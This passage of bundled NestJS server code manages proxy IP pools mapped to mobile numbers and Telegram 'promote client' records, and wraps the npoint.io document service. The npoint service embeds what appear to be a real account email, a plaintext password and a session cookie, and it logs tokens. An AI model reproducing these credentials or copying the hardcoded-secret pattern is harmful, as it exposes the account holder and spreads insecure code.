                this.proxyIpModel.updateOne({ ipAddress, port }, { $set: { isAssigned: false }, $unset: { assignedToClient: 1 } })
            ]);
            this.logger.log(`Released IP ${mapping.ipAddress} from mobile ${mobile}`);
        }
        catch (error) {
            if (error instanceof common_1.NotFoundException || error instanceof common_1.BadRequestException) {
                throw error;
            }
            this.logger.error(`Failed to release IP from mobile ${mobile}: ${error.message}`);
            throw new common_1.BadRequestException(`Failed to release IP from mobile: ${error.message}`);
        }
    }
    async getClientMobileMappings(clientId) {
        if (!clientId || clientId.trim() === '') {
            throw new common_1.BadRequestException('Client ID is required');
        }
        try {
            return this.ipMobileMappingModel.find({
                clientId: clientId.trim(),
                status: 'active'
            }).lean();
        }
        catch (error) {
            this.logger.error(`Error getting client mappings for ${clientId}: ${error.message}`);
            throw new common_1.BadRequestException(`Failed to get client mappings: ${error.message}`);
        }
    }
    async getStats() {
        try {
            const [total, available, assigned, inactive, totalMappings, activeMappings, inactiveMappings] = await Promise.all([
                this.proxyIpModel.countDocuments(),
                this.proxyIpModel.countDocuments({ status: 'active', isAssigned: false }),
                this.proxyIpModel.countDocuments({ isAssigned: true }),
                this.proxyIpModel.countDocuments({ status: 'inactive' }),
                this.ipMobileMappingModel.countDocuments(),
                this.ipMobileMappingModel.countDocuments({ status: 'active' }),
                this.ipMobileMappingModel.countDocuments({ status: 'inactive' })
            ]);
            return {
                total,
                available,
                assigned,
                inactive,
                mappings: {
                    total: totalMappings,
                    active: activeMappings,
                    inactive: inactiveMappings
                }
            };
        }
        catch (error) {
            this.logger.error(`Error getting statistics: ${error.message}`);
            throw new common_1.BadRequestException(`Failed to get statistics: ${error.message}`);
        }
    }
    async findProxyIpById(ipAddress, port) {
        if (!ipAddress || !port) {
            throw new common_1.BadRequestException('IP address and port are required');
        }
        try {
            const proxyIp = await this.proxyIpModel.findOne({ ipAddress, port }).lean();
            if (!proxyIp) {
                throw new common_1.NotFoundException(`Proxy IP ${ipAddress}:${port} not found`);
            }
            return proxyIp;
        }
        catch (error) {
            if (error instanceof common_1.NotFoundException) {
                throw error;
            }
            this.logger.error(`Error finding proxy IP ${ipAddress}:${port}: ${error.message}`);
            throw new common_1.BadRequestException(`Failed to find proxy IP: ${error.message}`);
        }
    }
    async getClientAssignedIps(clientId) {
        if (!clientId || clientId.trim() === '') {
            throw new common_1.BadRequestException('Client ID is required');
        }
        try {
            return this.proxyIpModel.find({
                assignedToClient: clientId.trim(),
                isAssigned: true
            }).lean();
        }
        catch (error) {
            this.logger.error(`Error getting assigned IPs for client ${clientId}: ${error.message}`);
            throw new common_1.BadRequestException(`Failed to get assigned IPs: ${error.message}`);
        }
    }
    async findMappingByMobile(mobile) {
        if (!mobile || mobile.trim() === '') {
            throw new common_1.BadRequestException('Mobile number is required');
        }
        try {
            return this.ipMobileMappingModel.findOne({
                mobile: mobile.trim(),
                status: 'active'
            }).lean();
        }
        catch (error) {
            this.logger.error(`Error finding mapping for mobile ${mobile}: ${error.message}`);
            throw new common_1.BadRequestException(`Failed to find mapping: ${error.message}`);
        }
    }
    async isIpAvailable(ipAddress, port) {
        if (!ipAddress || !port) {
            throw new common_1.BadRequestException('IP address and port are required');
        }
        try {
            const ip = await this.proxyIpModel.findOne({
                ipAddress,
                port,
                status: 'active',
                isAssigned: false
            }).lean();
            return ip !== null;
        }
        catch (error) {
            this.logger.error(`Error checking IP availability ${ipAddress}:${port}: ${error.message}`);
            return false;
        }
    }
    async getAvailableIpCount() {
        try {
            return this.proxyIpModel.countDocuments({
                status: 'active',
                isAssigned: false
            });
        }
        catch (error) {
            this.logger.error(`Error getting available IP count: ${error.message}`);
            return 0;
        }
    }
    async healthCheck() {
        try {
            const stats = await this.getStats();
            const issues = [];
            const utilizationRate = stats.total > 0 ? (stats.assigned / stats.total) * 100 : 0;
            let status = 'healthy';
            if (stats.available === 0) {
                status = 'critical';
                issues.push('No available IPs in pool');
            }
            else if (stats.available < 5) {
                status = 'warning';
                issues.push('Low IP availability (less than 5 IPs available)');
            }
            if (utilizationRate > 90) {
                status = utilizationRate > 95 ? 'critical' : 'warning';
                issues.push(`High utilization rate: ${utilizationRate.toFixed(1)}%`);
            }
            if (stats.inactive > stats.total * 0.2) {
                status = 'warning';
                issues.push('High number of inactive IPs');
            }
            return {
                status,
                availableIps: stats.available,
                totalActiveIps: stats.total - stats.inactive,
                utilizationRate: parseFloat(utilizationRate.toFixed(1)),
                issues
            };
        }
        catch (error) {
            this.logger.error(`Error during health check: ${error.message}`);
            return {
                status: 'critical',
                availableIps: 0,
                totalActiveIps: 0,
                utilizationRate: 0,
                issues: ['Health check failed']
            };
        }
    }
};
exports.IpManagementService = IpManagementService;
exports.IpManagementService = IpManagementService = IpManagementService_1 = __decorate([
    (0, common_1.Injectable)(),
    __param(0, (0, mongoose_1.InjectModel)(proxy_ip_schema_1.ProxyIp.name)),
    __param(1, (0, mongoose_1.InjectModel)(ip_mobile_mapping_schema_1.IpMobileMapping.name)),
    __metadata("design:paramtypes", [mongoose_2.Model,
        mongoose_2.Model])
], IpManagementService);


/***/ }),

/***/ "./src/components/ip-management/schemas/ip-mobile-mapping.schema.ts":
/*!**************************************************************************!*\
  !*** ./src/components/ip-management/schemas/ip-mobile-mapping.schema.ts ***!
  \**************************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.IpMobileMappingSchema = exports.IpMobileMapping = void 0;
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
let IpMobileMapping = class IpMobileMapping {
};
exports.IpMobileMapping = IpMobileMapping;
__decorate([
    (0, swagger_1.ApiProperty)({ example: '916265240911', description: 'Mobile number' }),
    (0, mongoose_1.Prop)({ required: true, unique: true }),
    __metadata("design:type", String)
], IpMobileMapping.prototype, "mobile", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: '192.168.1.100:8080', description: 'IP address and port combination' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], IpMobileMapping.prototype, "ipAddress", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'client1', description: 'Client ID that owns this mobile number' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], IpMobileMapping.prototype, "clientId", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'active', description: 'Status of this mapping', enum: ['active', 'inactive'] }),
    (0, mongoose_1.Prop)({ required: true, default: 'active', enum: ['active', 'inactive'] }),
    __metadata("design:type", String)
], IpMobileMapping.prototype, "status", void 0);
exports.IpMobileMapping = IpMobileMapping = __decorate([
    (0, mongoose_1.Schema)({
        collection: 'ip_mobile_mappings',
        versionKey: false,
        autoIndex: true,
        timestamps: true,
        toJSON: {
            virtuals: true,
            transform: (doc, ret) => {
                delete ret._id;
            },
        },
    })
], IpMobileMapping);
exports.IpMobileMappingSchema = mongoose_1.SchemaFactory.createForClass(IpMobileMapping);
exports.IpMobileMappingSchema.index({ clientId: 1 });
exports.IpMobileMappingSchema.index({ ipAddress: 1 });


/***/ }),

/***/ "./src/components/ip-management/schemas/proxy-ip.schema.ts":
/*!*****************************************************************!*\
  !*** ./src/components/ip-management/schemas/proxy-ip.schema.ts ***!
  \*****************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.ProxyIpSchema = exports.ProxyIp = void 0;
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
let ProxyIp = class ProxyIp {
};
exports.ProxyIp = ProxyIp;
__decorate([
    (0, swagger_1.ApiProperty)({ example: '192.168.1.100', description: 'IP address of the proxy' }),
    (0, mongoose_1.Prop)({ required: true, unique: true }),
    __metadata("design:type", String)
], ProxyIp.prototype, "ipAddress", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 8080, description: 'Port number of the proxy' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", Number)
], ProxyIp.prototype, "port", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'http', description: 'Protocol type (http, https, socks5)', enum: ['http', 'https', 'socks5'] }),
    (0, mongoose_1.Prop)({ required: true, enum: ['http', 'https', 'socks5'] }),
    __metadata("design:type", String)
], ProxyIp.prototype, "protocol", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'username', description: 'Username for proxy authentication' }),
    (0, mongoose_1.Prop)({ required: false }),
    __metadata("design:type", String)
], ProxyIp.prototype, "username", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'password', description: 'Password for proxy authentication' }),
    (0, mongoose_1.Prop)({ required: false }),
    __metadata("design:type", String)
], ProxyIp.prototype, "password", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'active', description: 'Status of the proxy IP', enum: ['active', 'inactive'] }),
    (0, mongoose_1.Prop)({ required: true, default: 'active', enum: ['active', 'inactive'] }),
    __metadata("design:type", String)
], ProxyIp.prototype, "status", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: false, description: 'Whether this IP is currently assigned to a mobile number' }),
    (0, mongoose_1.Prop)({ required: true, default: false }),
    __metadata("design:type", Boolean)
], ProxyIp.prototype, "isAssigned", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'client1', description: 'Client ID that owns this IP' }),
    (0, mongoose_1.Prop)({ required: false }),
    __metadata("design:type", String)
], ProxyIp.prototype, "assignedToClient", void 0);
exports.ProxyIp = ProxyIp = __decorate([
    (0, mongoose_1.Schema)({
        collection: 'proxy_ips',
        versionKey: false,
        autoIndex: true,
        timestamps: true,
        toJSON: {
            virtuals: true,
            transform: (doc, ret) => {
                delete ret._id;
            },
        },
    })
], ProxyIp);
exports.ProxyIpSchema = mongoose_1.SchemaFactory.createForClass(ProxyIp);
exports.ProxyIpSchema.index({ ipAddress: 1, port: 1 }, { unique: true });
exports.ProxyIpSchema.index({ status: 1, isAssigned: 1 });
exports.ProxyIpSchema.index({ assignedToClient: 1 });


/***/ }),

/***/ "./src/components/n-point/index.ts":
/*!*****************************************!*\
  !*** ./src/components/n-point/index.ts ***!
  \*****************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __exportStar = (this && this.__exportStar) || function(m, exports) {
    for (var p in m) if (p !== "default" && !Object.prototype.hasOwnProperty.call(exports, p)) __createBinding(exports, m, p);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
__exportStar(__webpack_require__(/*! ./npoint.controller */ "./src/components/n-point/npoint.controller.ts"), exports);
__exportStar(__webpack_require__(/*! ./npoint.module */ "./src/components/n-point/npoint.module.ts"), exports);
__exportStar(__webpack_require__(/*! ./npoint.service */ "./src/components/n-point/npoint.service.ts"), exports);


/***/ }),

/***/ "./src/components/n-point/npoint.controller.ts":
/*!*****************************************************!*\
  !*** ./src/components/n-point/npoint.controller.ts ***!
  \*****************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.NpointController = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const npoint_service_1 = __webpack_require__(/*! ./npoint.service */ "./src/components/n-point/npoint.service.ts");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
let NpointController = class NpointController {
    constructor(npointService) {
        this.npointService = npointService;
    }
    async fetchDocument(id) {
        try {
            return await this.npointService.fetchDocument(id);
        }
        catch (error) {
            throw new common_1.HttpException(error.message, common_1.HttpStatus.NOT_FOUND);
        }
    }
    async postDocument(document) {
        try {
            return await this.npointService.postDocument(document);
        }
        catch (error) {
            throw new common_1.HttpException(error.message, common_1.HttpStatus.BAD_REQUEST);
        }
    }
    async fetchAllDocuments() {
        try {
            return await this.npointService.fetchAllDocuments();
        }
        catch (error) {
            throw new common_1.HttpException(error.message, common_1.HttpStatus.INTERNAL_SERVER_ERROR);
        }
    }
    async updateDocument(id, updatedDocument) {
        try {
            return await this.npointService.updateDocument(id, updatedDocument);
        }
        catch (error) {
            throw new common_1.HttpException(error.message, common_1.HttpStatus.NOT_FOUND);
        }
    }
};
exports.NpointController = NpointController;
__decorate([
    (0, common_1.Get)('documents/:id'),
    (0, swagger_1.ApiOperation)({ summary: 'Fetch a document by ID' }),
    (0, swagger_1.ApiParam)({ name: 'id', description: 'The ID of the document to fetch' }),
    (0, swagger_1.ApiResponse)({
        status: 200,
        description: 'Document fetched successfully',
    }),
    (0, swagger_1.ApiResponse)({ status: 404, description: 'Document not found' }),
    __param(0, (0, common_1.Param)('id')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], NpointController.prototype, "fetchDocument", null);
__decorate([
    (0, common_1.Post)('documents'),
    (0, swagger_1.ApiOperation)({ summary: 'Post a new document' }),
    (0, swagger_1.ApiBody)({
        description: 'The document to post',
        schema: {
            example: {
                title: 'My Document',
                content: 'This is the content of the document.',
            },
        },
    }),
    (0, swagger_1.ApiResponse)({
        status: 201,
        description: 'Document posted successfully',
    }),
    (0, swagger_1.ApiResponse)({ status: 400, description: 'Invalid input' }),
    __param(0, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [Object]),
    __metadata("design:returntype", Promise)
], NpointController.prototype, "postDocument", null);
__decorate([
    (0, common_1.Get)('documents'),
    (0, swagger_1.ApiOperation)({ summary: 'Fetch all documents' }),
    (0, swagger_1.ApiResponse)({
        status: 200,
        description: 'List of all documents fetched successfully',
    }),
    (0, swagger_1.ApiResponse)({ status: 500, description: 'Internal server error' }),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", []),
    __metadata("design:returntype", Promise)
], NpointController.prototype, "fetchAllDocuments", null);
__decorate([
    (0, common_1.Put)('documents/:id'),
    (0, swagger_1.ApiOperation)({ summary: 'Update a document by ID' }),
    (0, swagger_1.ApiParam)({ name: 'id', description: 'The ID of the document to update' }),
    (0, swagger_1.ApiBody)({
        description: 'The updated document',
        schema: {
            example: {
                title: 'Updated Document',
                content: 'This is the updated content of the document.',
            },
        },
    }),
    (0, swagger_1.ApiResponse)({
        status: 200,
        description: 'Document updated successfully',
    }),
    (0, swagger_1.ApiResponse)({ status: 404, description: 'Document not found' }),
    __param(0, (0, common_1.Param)('id')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, Object]),
    __metadata("design:returntype", Promise)
], NpointController.prototype, "updateDocument", null);
exports.NpointController = NpointController = __decorate([
    (0, swagger_1.ApiTags)('NPoint API'),
    (0, common_1.Controller)('npoint'),
    __metadata("design:paramtypes", [npoint_service_1.NpointService])
], NpointController);


/***/ }),

/***/ "./src/components/n-point/npoint.module.ts":
/*!*************************************************!*\
  !*** ./src/components/n-point/npoint.module.ts ***!
  \*************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.NpointModule = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const npoint_service_1 = __webpack_require__(/*! ./npoint.service */ "./src/components/n-point/npoint.service.ts");
const npoint_controller_1 = __webpack_require__(/*! ./npoint.controller */ "./src/components/n-point/npoint.controller.ts");
const ConfigurationInit_1 = __webpack_require__(/*! ../ConfigurationInit */ "./src/components/ConfigurationInit/index.ts");
let NpointModule = class NpointModule {
};
exports.NpointModule = NpointModule;
exports.NpointModule = NpointModule = __decorate([
    (0, common_1.Module)({
        imports: [
            ConfigurationInit_1.InitModule,
        ],
        controllers: [npoint_controller_1.NpointController],
        providers: [npoint_service_1.NpointService],
        exports: [npoint_service_1.NpointService]
    })
], NpointModule);


/***/ }),

/***/ "./src/components/n-point/npoint.service.ts":
/*!**************************************************!*\
  !*** ./src/components/n-point/npoint.service.ts ***!
  \**************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
var NpointService_1;
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.NpointService = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const axios_1 = __importDefault(__webpack_require__(/*! axios */ "axios"));
let NpointService = NpointService_1 = class NpointService {
    constructor() {
        this.logger = new common_1.Logger(NpointService_1.name);
        this.csrfToken = null;
        this.cookie = '_npoint_session=MTBOeElFZ0pXV0oxTm9xd1dQQ0tNYnhVYWg1blFCMUVtUUJVWFQ1cGZwdlNwSTdacjBVTStJbDlHaGlWd0pGUDRzUmRaYnZNQVNTMTVmY1R6dEVUd0RPMXVFcmE1cnFYY09qd1A5TFpNVnZOUnVJRnlWV3ZtODk0ajlQVXQ0QzQ0MUtGeU5mTTB5dGFPNCtLUW9tVy9yTmFRZzlRQUdRK0NkQVVtZGxtMVEySzN0TC9sUjdMR2RjVW5xTmtleWw4TWdPOVNMa2JaZEs1c1o3eGE3UHdsQ2JiTEdQbHhUaysraCsrcG9LM25YREdyTDdpYWlHQ0wraEhNV3NXbzJtK1YvVzEvVTh2Z0N5bnpzU1hqcndiM041L2I3R29UMDY3RitBYkxvTktWaUVmdTg4SGJORjRTS25uZ2JDSWhmNWFoem0vNGNvUnAzMDBsQ0FJcUZTMjdnPT0tLWs2a2x2SUZqcHhDN1A0eFdUaWhBeVE9PQ%3D%3D--4d0883b9956c6d2744389228dab7321ff2eb88e5';
        this.baseUrl = 'https://www.npoint.io';
        this.signInUrl = 'https://www.npoint.io/users/sign_in';
    }
    async fetchCsrfToken() {
        this.logger.debug('Fetching CSRF token...');
        try {
            const data = JSON.stringify({
                "user": {
                    "email": "dodieajt@gmail.com",
                    "password": "Ajtdmwajt1@"
                }
            });
            const config = {
                method: 'post',
                maxBodyLength: Infinity,
                url: this.signInUrl,
                headers: {
                    'Content-Type': 'application/json',
                    'Cookie': this.cookie
                },
                data: data
            };
            const response = await axios_1.default.request(config);
            console.log("Cookie:", response.headers['set-cookie'][0]);
            this.cookie = response.headers['set-cookie'][0];
            this.csrfToken = await this.fetchCsrfTokenFromHtml(response.data);
            if (!this.csrfToken) {
                throw new Error('CSRF token not found in the sign-in response.');
            }
            this.logger.debug('CSRF token fetched successfully.');
            return this.csrfToken;
        }
        catch (error) {
            this.logger.error(`Failed to fetch CSRF token: ${error.message}`);
            throw new Error(`Failed to fetch CSRF token: ${error.message}`);
        }
    }
    async ensureCsrfToken() {
        if (!this.csrfToken) {
            await this.fetchCsrfToken();
        }
    }
    async fetchDocument(documentId) {
        this.logger.debug(`Fetching document with ID: ${documentId}`);
        await this.ensureCsrfToken();
        try {
            const response = await axios_1.default.get(`${this.baseUrl}/documents/${documentId}`, {
                headers: {
                    'X-CSRF-Token': this.csrfToken,
                    'Cookie': this.cookie
                },
            });
            this.logger.debug(`Document with ID: ${documentId} fetched successfully.`);
            return response.data;
        }
        catch (error) {
            this.logger.error(`Failed to fetch document with ID: ${documentId}: ${error.message}`);
            throw new Error(`Failed to fetch document: ${error.message}`);
        }
    }
    async postDocument(document) {
        this.logger.debug('Posting a new document...');
        await this.ensureCsrfToken();
        try {
            const response = await axios_1.default.post(`${this.baseUrl}/documents`, { "generate_contents": true }, {
                headers: {
                    'X-CSRF-Token': this.csrfToken,
                    'Cookie': this.cookie
                },
            });
            this.logger.debug(`Document posted successfully. Updating document with token: ${response.data.token}`);
            await this.updateDocument(response.data.token, document);
            return response.data;
        }
        catch (error) {
            this.logger.error(`Failed to post document: ${error.message}`);
            throw new Error(`Failed to post document: ${error.message}`);
        }
    }
    async updateDocument(documentId, updatedDocument) {
        this.logger.debug(`Updating document with ID: ${documentId}`);
        await this.ensureCsrfToken();
        const body = {
            "contents": JSON.stringify(updatedDocument),
            "original_contents": JSON.stringify(updatedDocument),
            "schema": null,
            "original_schema": ""
        };
        try {
            const response = await axios_1.default.put(`${this.baseUrl}/documents/${documentId}`, body, {
                headers: {
                    'X-CSRF-Token': this.csrfToken,
                    'Cookie': this.cookie
                },
            });
            this.logger.debug(`Document with ID: ${documentId} updated successfully.`);
            console.log(response.data.contents);
            return response.data;
        }
        catch (error) {
            this.logger.error(`Failed to update document with ID: ${documentId}: ${error.message}`);
            throw new Error(`Failed to update document: ${error.message}`);
        }
    }
    async fetchAllDocuments() {
        await this.ensureCsrfToken();
        try {
            const response = await axios_1.default.get(`${this.baseUrl}/documents`, {
                headers: {
                    'X-CSRF-Token': this.csrfToken,
                    'Cookie': this.cookie
                },
            });
            return response.data;
        }
        catch (error) {
            throw new Error(`Failed to fetch all documents: ${error.message}`);
        }
    }
    async fetchCsrfTokenFromHtml(data) {
        try {
            const csrfTokenMatch = data.match(/<meta name="csrf-token" content="([^"]+)"/);
            if (!csrfTokenMatch || !csrfTokenMatch[1]) {
                throw new Error('CSRF token not found in the HTML response.');
            }
            const csrfToken = csrfTokenMatch[1];
            console.log('CSRF Token:', csrfToken);
            return csrfToken;
        }
        catch (error) {
            console.error('Error fetching CSRF token:', error);
        }
    }
};
exports.NpointService = NpointService;
exports.NpointService = NpointService = NpointService_1 = __decorate([
    (0, common_1.Injectable)()
], NpointService);


/***/ }),

/***/ "./src/components/promote-clients/dto/create-promote-client.dto.ts":
/*!*************************************************************************!*\
  !*** ./src/components/promote-clients/dto/create-promote-client.dto.ts ***!
  \*************************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.CreatePromoteClientDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const class_validator_1 = __webpack_require__(/*! class-validator */ "class-validator");
class CreatePromoteClientDto {
}
exports.CreatePromoteClientDto = CreatePromoteClientDto;
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Telegram ID of the client',
        example: '123456789',
    }),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], CreatePromoteClientDto.prototype, "tgId", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Mobile number of the client',
        example: '+1234567890',
    }),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], CreatePromoteClientDto.prototype, "mobile", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Date of the session',
        example: '2023-06-22',
    }),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], CreatePromoteClientDto.prototype, "availableDate", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'lastActive identifier',
        example: '2023-06-22',
    }),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], CreatePromoteClientDto.prototype, "lastActive", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Channel Count',
        example: 23,
        type: Number
    }),
    (0, class_validator_1.IsNumber)(),
    __metadata("design:type", Number)
], CreatePromoteClientDto.prototype, "channels", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Client ID this promote mobile belongs to',
        example: 'client123',
        required: false
    }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], CreatePromoteClientDto.prototype, "clientId", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Status of the promote client',
        example: 'active',
        default: 'active',
        required: false
    }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], CreatePromoteClientDto.prototype, "status", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Status message for the promote client',
        example: 'Account is functioning properly',
        default: 'Account is functioning properly',
        required: false
    }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], CreatePromoteClientDto.prototype, "message", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Last used timestamp for the promote client',
        example: '2023-06-22T10:30:00.000Z',
        required: false
    }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsDateString)(),
    __metadata("design:type", Date)
], CreatePromoteClientDto.prototype, "lastUsed", void 0);


/***/ }),

/***/ "./src/components/promote-clients/dto/index.ts":
/*!*****************************************************!*\
  !*** ./src/components/promote-clients/dto/index.ts ***!
  \*****************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __exportStar = (this && this.__exportStar) || function(m, exports) {
    for (var p in m) if (p !== "default" && !Object.prototype.hasOwnProperty.call(exports, p)) __createBinding(exports, m, p);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
__exportStar(__webpack_require__(/*! ./create-promote-client.dto */ "./src/components/promote-clients/dto/create-promote-client.dto.ts"), exports);
__exportStar(__webpack_require__(/*! ./search-promote-client.dto */ "./src/components/promote-clients/dto/search-promote-client.dto.ts"), exports);
__exportStar(__webpack_require__(/*! ./update-promote-client.dto */ "./src/components/promote-clients/dto/update-promote-client.dto.ts"), exports);


/***/ }),

/***/ "./src/components/promote-clients/dto/search-promote-client.dto.ts":
/*!*************************************************************************!*\
